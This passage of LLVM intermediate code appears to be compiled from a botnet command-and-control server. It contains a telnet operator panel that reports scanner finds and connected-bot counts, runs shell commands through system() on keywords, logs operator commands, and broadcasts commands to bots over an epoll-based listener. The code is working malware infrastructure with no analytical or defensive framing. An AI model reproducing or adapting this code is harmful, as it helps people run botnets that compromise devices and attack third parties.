  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %171
  %173 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %172, i32 0, i32 0
  store i32 1, i32* %173, align 4
  br label %174

174:                                              ; preds = %354, %353, %223, %217, %167
  %175 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %176 = load i32, i32* %5, align 4
  %177 = call i32 @fdgets(i8* %175, i32 2048, i32 %176)
  %178 = icmp sgt i32 %177, 0
  br i1 %178, label %179, label %377

179:                                              ; preds = %174
  %180 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %181 = call i8* @strstr(i8* %180, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.35, i64 0, i64 0)) #8
  %182 = icmp ne i8* %181, null
  br i1 %182, label %183, label %196

183:                                              ; preds = %179
  %184 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %185 = load volatile i32, i32* @TELFound, align 4
  %186 = load volatile i32, i32* @scannerreport, align 4
  %187 = call i32 (i8*, i8*, ...) @sprintf(i8* %184, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.36, i64 0, i64 0), i32 %185, i32 %186) #9
  %188 = load i32, i32* %5, align 4
  %189 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %190 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %191 = call i64 @strlen(i8* %190) #8
  %192 = call i64 @send(i32 %188, i8* %189, i64 %191, i32 16384)
  %193 = icmp eq i64 %192, -1
  br i1 %193, label %194, label %195

194:                                              ; preds = %183
  store i8* null, i8** %2, align 8
  br label %387

195:                                              ; preds = %183
  br label %196

196:                                              ; preds = %195, %179
  %197 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %198 = call i8* @strstr(i8* %197, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i64 0, i64 0)) #8
  %199 = icmp ne i8* %198, null
  br i1 %199, label %200, label %213

200:                                              ; preds = %196
  %201 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %202 = call i32 @clientsConnected()
  %203 = load volatile i32, i32* @managesConnected, align 4
  %204 = call i32 (i8*, i8*, ...) @sprintf(i8* %201, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.38, i64 0, i64 0), i32 %202, i32 %203) #9
  %205 = load i32, i32* %5, align 4
  %206 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %207 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %208 = call i64 @strlen(i8* %207) #8
  %209 = call i64 @send(i32 %205, i8* %206, i64 %208, i32 16384)
  %210 = icmp eq i64 %209, -1
  br i1 %210, label %211, label %212

211:                                              ; preds = %200
  store i8* null, i8** %2, align 8
  br label %387

212:                                              ; preds = %200
  br label %213

213:                                              ; preds = %212, %196
  %214 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %215 = call i8* @strstr(i8* %214, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.39, i64 0, i64 0)) #8
  %216 = icmp ne i8* %215, null
  br i1 %216, label %217, label %219

217:                                              ; preds = %213
  %218 = call i32 @system(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.40, i64 0, i64 0))
  br label %174, !llvm.loop !19

219:                                              ; preds = %213
  %220 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %221 = call i8* @strstr(i8* %220, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.41, i64 0, i64 0)) #8
  %222 = icmp ne i8* %221, null
  br i1 %222, label %223, label %225

223:                                              ; preds = %219
  %224 = call i32 @system(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.42, i64 0, i64 0))
  br label %174, !llvm.loop !19

225:                                              ; preds = %219
  %226 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %227 = call i8* @strstr(i8* %226, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.43, i64 0, i64 0)) #8
  %228 = icmp ne i8* %227, null
  br i1 %228, label %229, label %338

229:                                              ; preds = %225
  %230 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %231 = call i32 @clientsConnected()
  %232 = load volatile i32, i32* @managesConnected, align 4
  %233 = call i32 (i8*, i8*, ...) @sprintf(i8* %230, i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.44, i64 0, i64 0), i32 %231, i32 %232) #9
  %234 = load i32, i32* %5, align 4
  %235 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %236 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %237 = call i64 @strlen(i8* %236) #8
  %238 = call i64 @send(i32 %234, i8* %235, i64 %237, i32 16384)
  %239 = icmp eq i64 %238, -1
  br i1 %239, label %240, label %241

240:                                              ; preds = %229
  store i8* null, i8** %2, align 8
  br label %387

241:                                              ; preds = %229
  %242 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %243 = call i32 @clientsConnected()
  %244 = load volatile i32, i32* @managesConnected, align 4
  %245 = call i32 (i8*, i8*, ...) @sprintf(i8* %242, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.45, i64 0, i64 0), i32 %243, i32 %244) #9
  %246 = load i32, i32* %5, align 4
  %247 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %248 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %249 = call i64 @strlen(i8* %248) #8
  %250 = call i64 @send(i32 %246, i8* %247, i64 %249, i32 16384)
  %251 = icmp eq i64 %250, -1
  br i1 %251, label %252, label %253

252:                                              ; preds = %241
  store i8* null, i8** %2, align 8
  br label %387

253:                                              ; preds = %241
  %254 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %255 = call i32 @clientsConnected()
  %256 = load volatile i32, i32* @managesConnected, align 4
  %257 = call i32 (i8*, i8*, ...) @sprintf(i8* %254, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.46, i64 0, i64 0), i32 %255, i32 %256) #9
  %258 = load i32, i32* %5, align 4
  %259 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %260 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %261 = call i64 @strlen(i8* %260) #8
  %262 = call i64 @send(i32 %258, i8* %259, i64 %261, i32 16384)
  %263 = icmp eq i64 %262, -1
  br i1 %263, label %264, label %265

264:                                              ; preds = %253
  store i8* null, i8** %2, align 8
  br label %387

265:                                              ; preds = %253
  %266 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %267 = call i32 @clientsConnected()
  %268 = load volatile i32, i32* @managesConnected, align 4
  %269 = call i32 (i8*, i8*, ...) @sprintf(i8* %266, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.47, i64 0, i64 0), i32 %267, i32 %268) #9
  %270 = load i32, i32* %5, align 4
  %271 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %272 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %273 = call i64 @strlen(i8* %272) #8
  %274 = call i64 @send(i32 %270, i8* %271, i64 %273, i32 16384)
  %275 = icmp eq i64 %274, -1
  br i1 %275, label %276, label %277

276:                                              ; preds = %265
  store i8* null, i8** %2, align 8
  br label %387

277:                                              ; preds = %265
  %278 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %279 = call i32 @clientsConnected()
  %280 = load volatile i32, i32* @managesConnected, align 4
  %281 = call i32 (i8*, i8*, ...) @sprintf(i8* %278, i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.48, i64 0, i64 0), i32 %279, i32 %280) #9
  %282 = load i32, i32* %5, align 4
  %283 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %284 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %285 = call i64 @strlen(i8* %284) #8
  %286 = call i64 @send(i32 %282, i8* %283, i64 %285, i32 16384)
  %287 = icmp eq i64 %286, -1
  br i1 %287, label %288, label %289

288:                                              ; preds = %277
  store i8* null, i8** %2, align 8
  br label %387

289:                                              ; preds = %277
  %290 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %291 = call i32 @clientsConnected()
  %292 = load volatile i32, i32* @managesConnected, align 4
  %293 = call i32 (i8*, i8*, ...) @sprintf(i8* %290, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.49, i64 0, i64 0), i32 %291, i32 %292) #9
  %294 = load i32, i32* %5, align 4
  %295 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %296 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %297 = call i64 @strlen(i8* %296) #8
  %298 = call i64 @send(i32 %294, i8* %295, i64 %297, i32 16384)
  %299 = icmp eq i64 %298, -1
  br i1 %299, label %300, label %301

300:                                              ; preds = %289
  store i8* null, i8** %2, align 8
  br label %387

301:                                              ; preds = %289
  %302 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %303 = call i32 @clientsConnected()
  %304 = load volatile i32, i32* @managesConnected, align 4
  %305 = call i32 (i8*, i8*, ...) @sprintf(i8* %302, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.50, i64 0, i64 0), i32 %303, i32 %304) #9
  %306 = load i32, i32* %5, align 4
  %307 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %308 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %309 = call i64 @strlen(i8* %308) #8
  %310 = call i64 @send(i32 %306, i8* %307, i64 %309, i32 16384)
  %311 = icmp eq i64 %310, -1
  br i1 %311, label %312, label %313

312:                                              ; preds = %301
  store i8* null, i8** %2, align 8
  br label %387

313:                                              ; preds = %301
  %314 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %315 = call i32 @clientsConnected()
  %316 = load volatile i32, i32* @managesConnected, align 4
  %317 = call i32 (i8*, i8*, ...) @sprintf(i8* %314, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.51, i64 0, i64 0), i32 %315, i32 %316) #9
  %318 = load i32, i32* %5, align 4
  %319 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %320 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %321 = call i64 @strlen(i8* %320) #8
  %322 = call i64 @send(i32 %318, i8* %319, i64 %321, i32 16384)
  %323 = icmp eq i64 %322, -1
  br i1 %323, label %324, label %325

324:                                              ; preds = %313
  store i8* null, i8** %2, align 8
  br label %387

325:                                              ; preds = %313
  %326 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %327 = call i32 @clientsConnected()
  %328 = load volatile i32, i32* @managesConnected, align 4
  %329 = call i32 (i8*, i8*, ...) @sprintf(i8* %326, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.52, i64 0, i64 0), i32 %327, i32 %328) #9
  %330 = load i32, i32* %5, align 4
  %331 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %332 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %333 = call i64 @strlen(i8* %332) #8
  %334 = call i64 @send(i32 %330, i8* %331, i64 %333, i32 16384)
  %335 = icmp eq i64 %334, -1
  br i1 %335, label %336, label %337

336:                                              ; preds = %325
  store i8* null, i8** %2, align 8
  br label %387

337:                                              ; preds = %325
  br label %338

338:                                              ; preds = %337, %225
  %339 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %340 = call i8* @strstr(i8* %339, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.53, i64 0, i64 0)) #8
  %341 = icmp ne i8* %340, null
  br i1 %341, label %342, label %343

342:                                              ; preds = %338
  br label %378

343:                                              ; preds = %338
  %344 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @trim(i8* %344)
  %345 = load i32, i32* %5, align 4
  %346 = call i64 @send(i32 %345, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.54, i64 0, i64 0), i64 11, i32 16384)
  %347 = icmp eq i64 %346, -1
  br i1 %347, label %348, label %349

348:                                              ; preds = %343
  br label %378

349:                                              ; preds = %343
  %350 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %351 = call i64 @strlen(i8* %350) #8
  %352 = icmp eq i64 %351, 0
  br i1 %352, label %353, label %354

353:                                              ; preds = %349
  br label %174, !llvm.loop !19

354:                                              ; preds = %349
  %355 = load i32, i32* %6, align 4
  %356 = sext i32 %355 to i64
  %357 = getelementptr inbounds [10 x %struct.account], [10 x %struct.account]* @accounts, i64 0, i64 %356
  %358 = getelementptr inbounds %struct.account, %struct.account* %357, i32 0, i32 0
  %359 = getelementptr inbounds [20 x i8], [20 x i8]* %358, i64 0, i64 0
  %360 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %361 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.55, i64 0, i64 0), i8* %359, i8* %360)
  %362 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.56, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.57, i64 0, i64 0))
  store %struct._IO_FILE* %362, %struct._IO_FILE** %20, align 8
  %363 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %364 = load i32, i32* %6, align 4
  %365 = sext i32 %364 to i64
  %366 = getelementptr inbounds [10 x %struct.account], [10 x %struct.account]* @accounts, i64 0, i64 %365
  %367 = getelementptr inbounds %struct.account, %struct.account* %366, i32 0, i32 0
  %368 = getelementptr inbounds [20 x i8], [20 x i8]* %367, i64 0, i64 0
  %369 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %370 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %363, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.55, i64 0, i64 0), i8* %368, i8* %369)
  %371 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %372 = call i32 @fclose(%struct._IO_FILE* %371)
  %373 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %374 = load i32, i32* %5, align 4
  %375 = getelementptr inbounds [80 x i8], [80 x i8]* %4, i64 0, i64 0
  call void @broadcast(i8* %373, i32 %374, i8* %375)
  %376 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %376, i8 0, i64 2048, i1 false)
  br label %174, !llvm.loop !19

377:                                              ; preds = %174
  br label %378

378:                                              ; preds = %377, %348, %342, %166, %161, %153, %145, %133, %132, %127, %122, %117, %98, %92, %71, %65
  %379 = load i32, i32* %5, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %380
  %382 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %381, i32 0, i32 0
  store i32 0, i32* %382, align 4
  %383 = load i32, i32* %5, align 4
  %384 = call i32 @close(i32 %383)
  %385 = load volatile i32, i32* @managesConnected, align 4
  %386 = add nsw i32 %385, -1
  store volatile i32 %386, i32* @managesConnected, align 4
  br label %387

387:                                              ; preds = %378, %336, %324, %312, %300, %288, %276, %264, %252, %240, %211, %194
  %388 = load i8*, i8** %2, align 8
  ret i8* %388
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @telnetListener(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %9 = call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %9, i32* %3, align 4
  %10 = load i32, i32* %3, align 4
  %11 = icmp slt i32 %10, 0
  br i1 %11, label %12, label %13

12:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.58, i64 0, i64 0))
  br label %13

13:                                               ; preds = %12, %1
  %14 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %14, i8 0, i64 16, i1 false)
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %15, align 4
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %17 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %16, i32 0, i32 0
  store i32 0, i32* %17, align 4
  %18 = load i32, i32* %2, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #10
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  %22 = load i32, i32* %3, align 4
  %23 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %24 = call i32 @bind(i32 %22, %struct.sockaddr* %23, i32 16) #9
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %27

26:                                               ; preds = %13
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.59, i64 0, i64 0))
  br label %27

27:                                               ; preds = %26, %13
  %28 = load i32, i32* %3, align 4
  %29 = call i32 @listen(i32 %28, i32 5) #9
  store i32 16, i32* %5, align 4
  br label %30

30:                                               ; preds = %27, %37
  %31 = load i32, i32* %3, align 4
  %32 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %33 = call i32 @accept(i32 %31, %struct.sockaddr* %32, i32* %5)
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp slt i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %30
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.60, i64 0, i64 0))
  br label %37

37:                                               ; preds = %36, %30
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = inttoptr i64 %39 to i8*
  %41 = call i32 @pthread_create(i64* %8, %union.pthread_attr_t* null, i8* (i8*)* @telnetWorker, i8* %40) #9
  br label %30
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %14 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #9
  %15 = load i32, i32* %5, align 4
  %16 = icmp ne i32 %15, 4
  br i1 %16, label %17, label %23

17:                                               ; preds = %3
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %18, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.61, i64 0, i64 0), i8* %21)
  call void @exit(i32 1) #11
  unreachable

23:                                               ; preds = %3
  %24 = load i8**, i8*** %6, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 3
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26) #8
  store i32 %27, i32* %10, align 4
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.62, i64 0, i64 0))
  %29 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.63, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.64, i64 0, i64 0))
  store %struct._IO_FILE* %29, %struct._IO_FILE** @telFD, align 8
  %30 = load i8**, i8*** %6, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 2
  %32 = load i8*, i8** %31, align 8
  %33 = call i32 @atoi(i8* %32) #8
  store i32 %33, i32* %9, align 4
  %34 = load i8**, i8*** %6, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 1
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @create_and_bind(i8* %36)
  store volatile i32 %37, i32* @listenFD, align 4
  %38 = load volatile i32, i32* @listenFD, align 4
  %39 = icmp eq i32 %38, -1
  br i1 %39, label %40, label %41

40:                                               ; preds = %23
  call void @abort() #11
  unreachable

41:                                               ; preds = %23
  %42 = load volatile i32, i32* @listenFD, align 4
  %43 = call i32 @make_socket_non_blocking(i32 %42)
  store i32 %43, i32* %8, align 4
  %44 = load i32, i32* %8, align 4
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %46, label %47

46:                                               ; preds = %41
  call void @abort() #11
  unreachable

47:                                               ; preds = %41
  %48 = load volatile i32, i32* @listenFD, align 4
  %49 = call i32 @listen(i32 %48, i32 4096) #9
  store i32 %49, i32* %8, align 4
  %50 = load i32, i32* %8, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

52:                                               ; preds = %47
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.65, i64 0, i64 0))
  call void @abort() #11
  unreachable

53:                                               ; preds = %47
  %54 = call i32 @epoll_create1(i32 0) #9
  store volatile i32 %54, i32* @epollFD, align 4
  %55 = load volatile i32, i32* @epollFD, align 4
  %56 = icmp eq i32 %55, -1
  br i1 %56, label %57, label %58

57:                                               ; preds = %53
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.66, i64 0, i64 0))
  call void @abort() #11
  unreachable

58:                                               ; preds = %53
  %59 = load volatile i32, i32* @listenFD, align 4
  %60 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %61 = bitcast %union.epoll_data* %60 to i32*
  store i32 %59, i32* %61, align 1
  %62 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %62, align 1
  %63 = load volatile i32, i32* @epollFD, align 4
  %64 = load volatile i32, i32* @listenFD, align 4
  %65 = call i32 @epoll_ctl(i32 %63, i32 1, i32 %64, %struct.epoll_event* %11) #9
  store i32 %65, i32* %8, align 4
  %66 = load i32, i32* %8, align 4
  %67 = icmp eq i32 %66, -1
  br i1 %67, label %68, label %69

68:                                               ; preds = %58
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.10, i64 0, i64 0))
  call void @abort() #11
  unreachable

69:                                               ; preds = %58
  %70 = load i32, i32* %9, align 4
  %71 = add nsw i32 %70, 2
  %72 = zext i32 %71 to i64
  %73 = call i8* @llvm.stacksave()
  store i8* %73, i8** %12, align 8
  %74 = alloca i64, i64 %72, align 16
  store i64 %72, i64* %13, align 8
  br label %75

75:                                               ; preds = %79, %69
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %76, -1
  store i32 %77, i32* %9, align 4
  %78 = icmp ne i32 %76, 0
  br i1 %78, label %79, label %85

79:                                               ; preds = %75
  %80 = load i32, i32* %9, align 4
  %81 = add nsw i32 %80, 1
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i64, i64* %74, i64 %82
  %84 = call i32 @pthread_create(i64* %83, %union.pthread_attr_t* null, i8* (i8*)* @epollEventLoop, i8* null) #9
  br label %75, !llvm.loop !20

85:                                               ; preds = %75
  %86 = getelementptr inbounds i64, i64* %74, i64 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = inttoptr i64 %88 to i8*
  %90 = call i32 @pthread_create(i64* %86, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* %89) #9
  br label %91

91:                                               ; preds = %92, %85
  br label %92

92:                                               ; preds = %91
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 -1, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.67, i64 0, i64 0))
  %93 = call i32 @sleep(i32 60)
  br label %91
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @create_and_bind(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #9
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.69, i64 0, i64 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #9
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #9
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.70, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
